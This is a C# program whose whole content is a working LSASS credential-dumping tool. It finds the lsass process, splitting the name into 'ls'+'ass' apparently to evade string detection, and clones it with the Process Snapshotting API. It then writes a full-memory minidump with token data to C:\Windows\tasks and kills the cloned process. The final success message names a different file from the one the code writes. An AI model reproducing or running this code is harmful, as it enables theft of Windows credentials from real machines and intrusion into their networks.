using System;
using System.IO;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DWORD = System.Int32;
using BOOL = System.Int32;
using HANDLE = System.IntPtr;
using HPSS = System.IntPtr;
using PVOID = System.IntPtr;
using PMINIDUMP_CALLBACK_INPUT = System.IntPtr;
using PMINIDUMP_CALLBACK_OUTPUT = System.IntPtr;
using PMINIDUMP_EXCEPTION_INFORMATION = System.IntPtr;
using PMINIDUMP_USER_STREAM_INFORMATION = System.IntPtr;
using PMINIDUMP_CALLBACK_INFORMATION = System.IntPtr;


namespace MiniDumpSnapshot
{
    internal enum MINIDUMP_CALLBACK_TYPE : uint
    {
        ModuleCallback,
        ThreadCallback,
        ThreadExCallback,
        IncludeThreadCallback,
        IncludeModuleCallback,
        MemoryCallback,
        CancelCallback,
        WriteKernelMinidumpCallback,
        KernelMinidumpStatusCallback,
        RemoveMemoryCallback,
        IncludeVmRegionCallback,
        IoStartCallback,
        IoWriteAllCallback,
        IoFinishCallback,
        ReadMemoryFailureCallback,
        SecondaryFlagsCallback,
        IsProcessSnapshotCallback,
        VmStartCallback,
        VmQueryCallback,
        VmPreReadCallback,
    }

    struct MINIDUMP_CALLBACK_OUTPUT
    {
        public int Status; 
    }

    internal struct MINIDUMP_CALLBACK_INFORMATION
    {
        public IntPtr CallbackRoutine;
        public PVOID CallbackParam;
    }
    [Flags]
    internal enum PSS_CAPTURE_FLAGS : uint
    {
        PSS_CAPTURE_NONE = 0x00000000,
        PSS_CAPTURE_VA_CLONE = 0x00000001,
        PSS_CAPTURE_RESERVED_00000002 = 0x00000002,
        PSS_CAPTURE_HANDLES = 0x00000004,
        PSS_CAPTURE_HANDLE_NAME_INFORMATION = 0x00000008,
        PSS_CAPTURE_HANDLE_BASIC_INFORMATION = 0x00000010,
        PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = 0x00000020,
        PSS_CAPTURE_HANDLE_TRACE = 0x00000040,
        PSS_CAPTURE_THREADS = 0x00000080,
        PSS_CAPTURE_THREAD_CONTEXT = 0x00000100,
        PSS_CAPTURE_THREAD_CONTEXT_EXTENDED = 0x00000200,
        PSS_CAPTURE_RESERVED_00000400 = 0x00000400,
        PSS_CAPTURE_VA_SPACE = 0x00000800,
        PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION = 0x00001000,
        PSS_CREATE_BREAKAWAY_OPTIONAL = 0x04000000,
        PSS_CREATE_BREAKAWAY = 0x08000000,
        PSS_CREATE_FORCE_BREAKAWAY = 0x10000000,
        PSS_CREATE_USE_VM_ALLOCATIONS = 0x20000000,
        PSS_CREATE_MEASURE_PERFORMANCE = 0x40000000,
        PSS_CREATE_RELEASE_SECTION = 0x80000000
    }

    internal enum PSS_QUERY_INFORMATION_CLASS
    {
        PSS_QUERY_PROCESS_INFORMATION = 0,
        PSS_QUERY_VA_CLONE_INFORMATION = 1,
        PSS_QUERY_AUXILIARY_PAGES_INFORMATION = 2,
        PSS_QUERY_VA_SPACE_INFORMATION = 3,
        PSS_QUERY_HANDLE_INFORMATION = 4,
        PSS_QUERY_THREAD_INFORMATION = 5,
        PSS_QUERY_HANDLE_TRACE_INFORMATION = 6,
        PSS_QUERY_PERFORMANCE_COUNTERS = 7
    }

    [Flags]
    internal enum MINIDUMP_TYPE : int
    {
        MiniDumpNormal = 0x00000000,
        MiniDumpWithDataSegs = 0x00000001,
        MiniDumpWithFullMemory = 0x00000002,
        MiniDumpWithHandleData = 0x00000004,
        MiniDumpFilterMemory = 0x00000008,
        MiniDumpScanMemory = 0x00000010,
        MiniDumpWithUnloadedModules = 0x00000020,
        MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
        MiniDumpFilterModulePaths = 0x00000080,
        MiniDumpWithProcessThreadData = 0x00000100,
        MiniDumpWithPrivateReadWriteMemory = 0x00000200,
        MiniDumpWithoutOptionalData = 0x00000400,
        MiniDumpWithFullMemoryInfo = 0x00000800,
        MiniDumpWithThreadInfo = 0x00001000,
        MiniDumpWithCodeSegs = 0x00002000,
        MiniDumpWithoutAuxiliaryState = 0x00004000,
        MiniDumpWithFullAuxiliaryState = 0x00008000,
        MiniDumpWithPrivateWriteCopyMemory = 0x00010000,
        MiniDumpIgnoreInaccessibleMemory = 0x00020000,
        MiniDumpWithTokenInformation = 0x00040000,
        MiniDumpWithModuleHeaders = 0x00080000,
        MiniDumpFilterTriage = 0x00100000,
        MiniDumpValidTypeFlags = 0x001fffff
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate BOOL MiniDumpCallback(PVOID CallbackParam, PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput);
    class Program
    {
        [DllImport("dbghelp")]
        internal static extern DWORD MiniDumpWriteDump(HANDLE hProcess, DWORD ProcessId, HANDLE hFile, MINIDUMP_TYPE DumpType, PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, PMINIDUMP_CALLBACK_INFORMATION CallbackParam);

        internal static BOOL MiniDumpCallbackMethod(PVOID parameter, PMINIDUMP_CALLBACK_INPUT inp, PMINIDUMP_CALLBACK_OUTPUT op)
        {
            unsafe
            {
                if (Marshal.ReadByte(inp + sizeof(int) + IntPtr.Size) == (int)MINIDUMP_CALLBACK_TYPE.IsProcessSnapshotCallback)
                {
                    var obj = (MINIDUMP_CALLBACK_OUTPUT*)op;
                    obj->Status = 1;
                }
            }

            return 1;
        }

        [DllImport("kernel32")]
        internal static extern DWORD PssQuerySnapshot(HPSS SnapshotHandle, PSS_QUERY_INFORMATION_CLASS InformationClass, out IntPtr Buffer, DWORD BufferLength);

        [DllImport("kernel32")]
        internal static extern DWORD PssCaptureSnapshot(HANDLE ProcessHandle, PSS_CAPTURE_FLAGS CaptureFlags, DWORD ThreadContextFlags, out HPSS SnapshotHandle);

        [DllImport("kernel32")]
        internal static extern DWORD PssFreeSnapshot(HANDLE ProcessHandle, HPSS SnapshotHandle);

        [DllImport("kernel32")]
        internal static extern BOOL CloseHandle(HANDLE hObject);

        [DllImport("kernel32")]
        internal static extern BOOL GetProcessId(HANDLE hObject);

        static int Main(string[] args)
        {
            
            Process[] lsass = Process.GetProcessesByName("ls"+"ass");
            int processid = lsass[0].Id;
            HANDLE h;
            try
            {
                var pro = Process.GetProcessById(processid);
                h = pro.Handle;
            }
            catch (ArgumentException)
            {
                Console.WriteLine($"Process does not exist");
                return -2;
            }

            var flags = PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE |
                        PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES |
                        PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_NAME_INFORMATION |
                        PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_BASIC_INFORMATION |
                        PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION |
                        PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TRACE |
                        PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREADS |
                        PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT |
                        PSS_CAPTURE_FLAGS.PSS_CREATE_MEASURE_PERFORMANCE;

            HPSS sHandle;
            

            
            DWORD hresult = PssCaptureSnapshot(h, flags, IntPtr.Size == 8 ? 0x0010001F : 0x0001003F, out sHandle);
            

            if (hresult != 0)
            {
                Console.WriteLine($"Sorry the Snapshot failed :( ({hresult})");
                return hresult;
            }

            using (var file = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create))
            {
                var CbackDelegate = new MiniDumpCallback(MiniDumpCallbackMethod);
                var CbackParam = Marshal.AllocHGlobal(IntPtr.Size * 2);

                unsafe
                {
                    var pointr = (MINIDUMP_CALLBACK_INFORMATION*)CbackParam;
                    pointr->CallbackRoutine = Marshal.GetFunctionPointerForDelegate(CbackDelegate);
                    pointr->CallbackParam = IntPtr.Zero;
                }

                var MFlag = MINIDUMP_TYPE.MiniDumpWithDataSegs |
                                    MINIDUMP_TYPE.MiniDumpWithTokenInformation |
                                    MINIDUMP_TYPE.MiniDumpWithPrivateWriteCopyMemory |
                                    MINIDUMP_TYPE.MiniDumpWithPrivateReadWriteMemory |
                                    MINIDUMP_TYPE.MiniDumpWithUnloadedModules |
                                    MINIDUMP_TYPE.MiniDumpWithFullMemory |
                                    MINIDUMP_TYPE.MiniDumpWithHandleData |
                                    MINIDUMP_TYPE.MiniDumpWithThreadInfo |
                                    MINIDUMP_TYPE.MiniDumpWithFullMemoryInfo |
                                    MINIDUMP_TYPE.MiniDumpWithProcessThreadData |
                                    MINIDUMP_TYPE.MiniDumpWithModuleHeaders;

                hresult = MiniDumpWriteDump(sHandle, processid, file.SafeFileHandle.DangerousGetHandle(), MFlag, IntPtr.Zero, IntPtr.Zero, CbackParam);

                IntPtr VcHandle;
                PssQuerySnapshot(sHandle, PSS_QUERY_INFORMATION_CLASS.PSS_QUERY_VA_CLONE_INFORMATION, out VcHandle, IntPtr.Size);

                var cloneProid = GetProcessId(VcHandle);

                PssFreeSnapshot(Process.GetCurrentProcess().Handle, sHandle);
                CloseHandle(VcHandle);

                try
                {
                    Process.GetProcessById(cloneProid).Kill();
                }
                catch (Win32Exception)
                {
                }

                Marshal.FreeHGlobal(CbackParam);
                GC.KeepAlive(CbackDelegate);

                if (hresult == 0)
                {
                    Console.WriteLine($"MiniDumpWriteDump failed. ({Marshal.GetHRForLastWin32Error()})");
                    return hresult;
                }
            }

            
            Console.WriteLine($"[+] LSASS Successsfully Dumped at 'C:\\Windows\\tasks\\memory.dmp'");
            return 0;
        }
    }
}
        
